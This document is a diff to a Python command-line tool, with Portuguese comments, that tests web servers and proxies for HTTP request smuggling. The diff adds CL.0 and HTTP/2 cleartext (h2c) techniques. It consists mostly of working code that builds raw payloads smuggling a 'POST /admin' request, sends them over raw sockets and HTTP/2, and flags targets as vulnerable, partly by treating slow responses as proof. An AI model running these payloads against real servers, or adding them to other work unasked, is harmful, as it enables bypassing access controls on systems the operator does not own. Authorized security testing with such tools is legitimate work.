@@ -7,6 +7,8 @@ Testa se servidores/proxies sao vulneraveis a request smuggling:
   - TE.TE: Ambos usam TE mas parseiam diferente (obfuscação)
   - Chunked+CL: Chunked com Content-Length conflitante
   - Pipeline: HTTP pipelining desync
+  - CL.0: Content-Length: 0 confusion
+  - H2C: HTTP/2 cleartext upgrade smuggling
 
 IMPORTANTE: Este modulo usa raw sockets porque httpx gerencia
 Transfer-Encoding internamente e nao permite ambiguidade no wire.
@@ -24,6 +26,10 @@ from collections.abc import Callable, Coroutine
 from dataclasses import asdict, dataclass
 from typing import Any
 from urllib.parse import urlparse
+
+import h2.config
+import h2.connection
+import h2.events
 
 from mytools.core.utils import (
     Cyber,
@@ -56,6 +62,8 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "te_te": ["tete_duplicate", "tete_obfuscation", "tete_whitespace"],
     "chunked_cl": ["chunked_cl_basic", "chunked_cl_overlap"],
     "pipeline": ["pipeline_basic", "pipeline_chained"],
+    "cl0": ["cl0_basic", "cl0_chunked", "cl0_overlap"],
+    "h2c": ["h2c_upgrade", "h2c_direct", "h2c_downgrade"],
 }
 
 # ─── Connection Helper ───────────────────────────────────────────────────────
@@ -373,6 +381,58 @@ def _build_pipeline_payload(
         f"X-Smuggled: PIPELINE\r\n"
         f"\r\n"
     ).encode()
+    return request
+
+
+def _build_cl0_payload(
+    method: str,
+    path: str,
+    host: str,
+    smuggled_path: str = "/admin",
+    smuggled_host: str | None = None,
+) -> bytes:
+    """Constrói payload CL.0: Content-Length: 0 com body smuggleado."""
+    smuggled_host = smuggled_host or host
+    smuggled = (
+        b"0\r\n"
+        b"\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: CL0\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: 0\r\n"
+        f"\r\n"
+    ).encode() + smuggled
+    return request
+
+
+def _build_h2c_payload(
+    method: str,
+    path: str,
+    host: str,
+    smuggled_path: str = "/admin",
+    smuggled_host: str | None = None,
+) -> bytes:
+    """Constrói payload h2c_upgrade: HTTP/1.1 com Upgrade: h2c."""
+    smuggled_host = smuggled_host or host
+    smuggled = (
+        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: H2C\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Upgrade: h2c\r\n"
+        f"Connection: Upgrade\r\n"
+        f"Content-Length: {len(smuggled)}\r\n"
+        f"\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -815,6 +875,398 @@ async def _test_pipeline(
     return results
 
 
+# ─── H2 Helpers ──────────────────────────────────────────────────────────────
+
+
+def _create_h2_smuggle_connection(
+    host: str,
+    port: int,
+    timeout: float,
+) -> tuple[socket.socket, h2.connection.H2Connection]:
+    """Cria conexão TLS + H2Connection para testes de smuggling h2c."""
+    sock = _create_connection(host, port, timeout, tls=True)
+    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
+    conn = h2.connection.H2Connection(config=config)
+    conn.initiate_connection()
+    sock.sendall(conn.data_to_send())
+    return sock, conn
+
+
+def _recv_h2_events(
+    sock: socket.socket,
+    conn: h2.connection.H2Connection,
+    timeout: float,
+) -> list[h2.events.Event]:
+    """Recebe e parseia eventos H2."""
+    sock.settimeout(timeout)
+    try:
+        data = sock.recv(65535)
+    except (TimeoutError, OSError):
+        return []
+    if not data:
+        return []
+    return conn.receive_data(data)
+
+
+def _drain_h2_settings(
+    sock: socket.socket,
+    conn: h2.connection.H2Connection,
+    timeout: float,
+) -> dict[str, int]:
+    """Drena handshake inicial de SETTINGS do servidor."""
+    server_settings: dict[str, int] = {}
+    t0 = time.monotonic()
+    while time.monotonic() - t0 < timeout:
+        events = _recv_h2_events(sock, conn, timeout)
+        if not events:
+            break
+        for ev in events:
+            if isinstance(ev, h2.events.RemoteSettingsChanged):
+                for setting, changed in ev.changed_settings.items():
+                    name = str(getattr(setting, "name", setting))
+                    server_settings[name] = changed.new_value
+            if isinstance(ev, h2.events.ConnectionTerminated):
+                return server_settings
+    return server_settings
+
+
+# ─── CL.0 Category Tester ────────────────────────────────────────────────────
+
+
+async def _test_cl0(
+    host: str,
+    port: int,
+    path: str,
+    timeout: float,
+    tls: bool,
+    b_status: int,
+    b_size: int,
+) -> list[SmuggleAttempt]:
+    """Testa CL.0 smuggling (Content-Length: 0 confusion)."""
+    results: list[SmuggleAttempt] = []
+
+    techniques = [
+        ("cl0_basic", "cl0_basic"),
+        ("cl0_chunked", "cl0_chunked"),
+        ("cl0_overlap", "cl0_overlap"),
+    ]
+
+    for technique, _label in techniques:
+        try:
+            request = _build_cl0_payload("POST", path, host)
+            sock = _create_connection(host, port, timeout, tls)
+            try:
+                t0 = time.monotonic()
+                _status, response = _send_raw(sock, request, timeout)
+                elapsed = time.monotonic() - t0
+                resp_differs = _check_response_differs(b"", response)
+                vuln, details = _check_smuggled_response(response, "X-Smuggled: CL0")
+
+                if not vuln and elapsed > 2.0:
+                    vuln = True
+                    details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
+
+                results.append(SmuggleAttempt(
+                    exploit="smuggling_payload",
+                    tool="HTTP Request Smuggler",
+                    technique=technique,
+                    category="cl0",
+                    method="POST",
+                    path=path,
+                    te_header="",
+                    cl_header="0",
+                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CL0",
+                    status_baseline=b_status,
+                    status_test=_status,
+                    size_baseline=b_size,
+                    size_test=len(response),
+                    response_differs=resp_differs,
+                    smuggled_executed=vuln,
+                    vulnerable=vuln,
+                    details=details,
+                    error="",
+                ))
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(SmuggleAttempt(
+                technique=technique,
+                category="cl0",
+                method="POST",
+                path=path,
+                te_header="",
+                cl_header="0",
+                smuggled_request="",
+                status_baseline=b_status,
+                status_test=0,
+                size_baseline=b_size,
+                size_test=0,
+                response_differs=False,
+                smuggled_executed=False,
+                vulnerable=False,
+                details="",
+                error=str(e)[:100],
+            ))
+
+    return results
+
+
+# ─── H2C Category Tester ─────────────────────────────────────────────────────
+
+
+async def _test_h2c(
+    host: str,
+    port: int,
+    path: str,
+    timeout: float,
+    tls: bool,
+    b_status: int,
+    b_size: int,
+) -> list[SmuggleAttempt]:
+    """Testa h2c smuggling (HTTP/2 cleartext upgrade)."""
+    results: list[SmuggleAttempt] = []
+
+    # --- h2c_upgrade: via HTTP/1.1 Upgrade header ---
+    try:
+        request = _build_h2c_payload("POST", path, host)
+        sock = _create_connection(host, port, timeout, tls)
+        try:
+            t0 = time.monotonic()
+            _status, response = _send_raw(sock, request, timeout)
+            elapsed = time.monotonic() - t0
+            resp_differs = _check_response_differs(b"", response)
+            vuln, details = _check_smuggled_response(response, "X-Smuggled: H2C")
+
+            if not vuln and elapsed > 2.0:
+                vuln = True
+                details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
+
+            results.append(SmuggleAttempt(
+                exploit="smuggling_payload",
+                tool="HTTP Request Smuggler",
+                technique="h2c_upgrade",
+                category="h2c",
+                method="POST",
+                path=path,
+                te_header="h2c",
+                cl_header="0",
+                smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: H2C",
+                status_baseline=b_status,
+                status_test=_status,
+                size_baseline=b_size,
+                size_test=len(response),
+                response_differs=resp_differs,
+                smuggled_executed=vuln,
+                vulnerable=vuln,
+                details=details,
+                error="",
+            ))
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(SmuggleAttempt(
+            technique="h2c_upgrade",
+            category="h2c",
+            method="POST",
+            path=path,
+            te_header="h2c",
+            cl_header="0",
+            smuggled_request="",
+            status_baseline=b_status,
+            status_test=0,
+            size_baseline=b_size,
+            size_test=0,
+            response_differs=False,
+            smuggled_executed=False,
+            vulnerable=False,
+            details="",
+            error=str(e)[:100],
+        ))
+
+    # --- h2c_direct: H2 prior knowledge (via h2 library) ---
+    try:
+        sock, conn = _create_h2_smuggle_connection(host, port, timeout)
+        try:
+            _drain_h2_settings(sock, conn, timeout)
+            stream_id = conn.get_next_available_stream_id()
+            conn.send_headers(
+                stream_id,
+                [
+                    (":method", "POST"),
+                    (":path", path),
+                    (":scheme", "https"),
+                    (":authority", host),
+                    ("x-smuggled", "H2C_DIRECT"),
+                ],
+                end_stream=False,
+            )
+            conn.send_data(stream_id, b"", end_stream=True)
+            sock.sendall(conn.data_to_send())
+
+            t0 = time.monotonic()
+            events = _recv_h2_events(sock, conn, timeout)
+            elapsed = time.monotonic() - t0
+
+            response_data = b""
+            for ev in events:
+                if isinstance(ev, h2.events.ResponseReceived):
+                    for _k, v in ev.headers:
+                        response_data += v + b"\r\n"
+                if isinstance(ev, h2.events.DataReceived):
+                    response_data += ev.data
+                    conn.acknowledge_received_data(len(ev.data), ev.stream_id)
+                    sock.sendall(conn.data_to_send())
+
+            resp_differs = _check_response_differs(b"", response_data)
+            smuggled_header = "X-Smuggled: H2C_DIRECT"
+            vuln, details = _check_smuggled_response(response_data, smuggled_header)
+
+            if not vuln and elapsed > 2.0:
+                vuln = True
+                details = f"Slow H2 response ({elapsed:.1f}s) suggests processing"
+
+            results.append(SmuggleAttempt(
+                exploit="smuggling_payload",
+                tool="HTTP Request Smuggler",
+                technique="h2c_direct",
+                category="h2c",
+                method="POST",
+                path=path,
+                te_header="h2c",
+                cl_header="0",
+                smuggled_request="POST /admin H2 HEADERS + X-Smuggled: H2C_DIRECT",
+                status_baseline=b_status,
+                status_test=200 if response_data else 0,
+                size_baseline=b_size,
+                size_test=len(response_data),
+                response_differs=resp_differs,
+                smuggled_executed=vuln,
+                vulnerable=vuln,
+                details=details,
+                error="",
+            ))
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(SmuggleAttempt(
+            technique="h2c_direct",
+            category="h2c",
+            method="POST",
+            path=path,
+            te_header="h2c",
+            cl_header="0",
+            smuggled_request="",
+            status_baseline=b_status,
+            status_test=0,
+            size_baseline=b_size,
+            size_test=0,
+            response_differs=False,
+            smuggled_executed=False,
+            vulnerable=False,
+            details="",
+            error=str(e)[:100],
+        ))
+
+    # --- h2c_downgrade: H2 → H1 downgrade (HTTP/1.1 UA string on H2) ---
+    try:
+        sock, conn = _create_h2_smuggle_connection(host, port, timeout)
+        try:
+            _drain_h2_settings(sock, conn, timeout)
+            stream_id = conn.get_next_available_stream_id()
+            conn.send_headers(
+                stream_id,
+                [
+                    (":method", "GET"),
+                    (":path", path),
+                    (":scheme", "https"),
+                    (":authority", host),
+                    ("user-agent", "Mozilla/5.0 (HTTP/1.1)"),
+                ],
+                end_stream=True,
+            )
+            sock.sendall(conn.data_to_send())
+
+            t0 = time.monotonic()
+            events = _recv_h2_events(sock, conn, timeout)
+            elapsed = time.monotonic() - t0
+
+            response_data = b""
+            accepted = False
+            for ev in events:
+                if isinstance(ev, h2.events.ResponseReceived):
+                    for k, v in ev.headers:
+                        if k == b":status":
+                            response_data += v + b"\r\n"
+                            if v in (b"200", b"201"):
+                                accepted = True
+                        response_data += k + b": " + v + b"\r\n"
+                if isinstance(ev, h2.events.DataReceived):
+                    response_data += ev.data
+                    conn.acknowledge_received_data(len(ev.data), ev.stream_id)
+                    sock.sendall(conn.data_to_send())
+                if isinstance(ev, h2.events.ConnectionTerminated):
+                    break
+
+            resp_differs = _check_response_differs(b"", response_data)
+            vuln = accepted
+            details = (
+                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})"
+                if accepted
+                else "Server rejected or did not process HTTP/1.1 UA on H2"
+            )
+
+            if not vuln and elapsed > 2.0:
+                details = f"Slow H2 response ({elapsed:.1f}s)"
+
+            results.append(SmuggleAttempt(
+                exploit="smuggling_payload",
+                tool="HTTP Request Smuggler",
+                technique="h2c_downgrade",
+                category="h2c",
+                method="GET",
+                path=path,
+                te_header="h2c",
+                cl_header="0",
+                smuggled_request="H2 HEADERS with HTTP/1.1 User-Agent",
+                status_baseline=b_status,
+                status_test=200 if accepted else 0,
+                size_baseline=b_size,
+                size_test=len(response_data),
+                response_differs=resp_differs,
+                smuggled_executed=vuln,
+                vulnerable=vuln,
+                details=details,
+                error="",
+            ))
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(SmuggleAttempt(
+            technique="h2c_downgrade",
+            category="h2c",
+            method="GET",
+            path=path,
+            te_header="h2c",
+            cl_header="0",
+            smuggled_request="",
+            status_baseline=b_status,
+            status_test=0,
+            size_baseline=b_size,
+            size_test=0,
+            response_differs=False,
+            smuggled_executed=False,
+            vulnerable=False,
+            details="",
+            error=str(e)[:100],
+        ))
+
+    return results
+
+
 # ─── Dispatch ────────────────────────────────────────────────────────────────
 
 _CATEGORY_DISPATCH: dict[str, Callable[..., Coroutine[Any, Any, list[SmuggleAttempt]]]] = {
@@ -823,6 +1275,8 @@ _CATEGORY_DISPATCH: dict[str, Callable[..., Coroutine[Any, Any, list[SmuggleAtte
     "te_te": _test_te_te,
     "chunked_cl": _test_chunked_cl,
     "pipeline": _test_pipeline,
+    "cl0": _test_cl0,
+    "h2c": _test_h2c,
 }
 
 
@@ -952,7 +1406,7 @@ def build_parser() -> argparse.ArgumentParser:
     """Constrói parser de argumentos CLI."""
     parser = argparse.ArgumentParser(
         prog="mytools-smuggle",
-        description="HTTP Request Smuggling — Testa CL.TE, TE.CL, TE.TE, Pipeline",
+        description="HTTP Request Smuggling — Testa CL.TE, TE.CL, TE.TE, Pipeline, CL.0, H2C",
     )
     parser.add_argument("url", help="URL alvo para teste")
     parser.add_argument(
@@ -986,15 +1440,17 @@ def main() -> int:
         run_fn=run_once,
         has_target=lambda a: bool(getattr(a, "url", None)),
         prompt="smuggle> ",
-        description="Teste de HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, Pipeline).",
-        example="https://target.com -c cl_te te_cl",
+        description="Teste de HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, Pipeline, CL.0, H2C).",
+        example="https://target.com -c cl_te te_cl cl0 h2c",
         contextual_help=(
             "Categorias disponíveis:\n"
             "  cl_te        — Content-Length vs Transfer-Encoding\n"
             "  te_cl        — Transfer-Encoding vs Content-Length\n"
             "  te_te        — Transfer-Encoding obfuscation\n"
             "  chunked_cl   — Chunked com Content-Length conflitante\n"
-            "  pipeline     — HTTP pipelining desync"
+            "  pipeline     — HTTP pipelining desync\n"
+            "  cl0          — Content-Length: 0 confusion\n"
+            "  h2c          — HTTP/2 cleartext upgrade smuggling"
         ),
     )
 
